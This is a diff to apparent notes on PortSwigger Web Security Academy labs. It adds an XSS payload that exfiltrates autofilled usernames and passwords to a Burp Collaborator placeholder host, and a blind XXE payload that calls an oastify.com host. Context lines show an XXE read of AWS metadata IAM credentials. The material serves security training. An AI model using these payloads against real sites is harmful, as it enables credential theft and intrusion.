@@ -333,6 +333,23 @@ Payload:
 
     a</option></select><script>alert(1)</script><select><option>b
 
+### Lab: Exploiting cross-site scripting to capture passwords
+
+    https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
+
+In order to work in real-life a victim would have to has credentials auto-fill turned on in his browser. 
+
+Payload:
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
 ## OAuth authentication
 
 ### Lab: Forced OAuth profile linking
@@ -423,6 +440,21 @@ Payload:
 ```
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 ```
+
+### Lab: Blind XXE with out-of-band interaction via XML parameter entities
+
+    https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
+
+Payload (just triggers DNS lookup):
+
+    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ho9r30vx4898fiwjmqxnxqh2vt1lpodd.oastify.com"> %xxe; ]>
+
+Solution:
+
+<img width="1194" height="679" alt="image" src="https://github.com/user-attachments/assets/ff5d57d4-48a9-477b-8875-8b47597e5377" />
+
+
+
 
 ## Cross-site request forgery (CSRF)
 
